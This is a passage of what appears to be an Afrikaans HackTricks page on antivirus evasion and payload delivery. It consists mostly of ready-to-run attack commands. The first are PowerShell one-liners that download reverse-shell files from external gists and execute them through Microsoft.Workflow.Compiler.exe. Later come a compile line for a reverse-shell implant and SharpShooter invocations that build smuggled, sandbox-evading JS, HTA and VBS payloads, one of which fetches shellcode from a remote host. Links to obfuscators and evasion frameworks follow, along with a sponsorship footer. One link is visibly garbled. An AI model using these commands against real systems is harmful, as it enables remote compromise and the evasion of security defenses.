powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# obfuscators lys: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik van python vir die bou van inspuiters voorbeeld:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
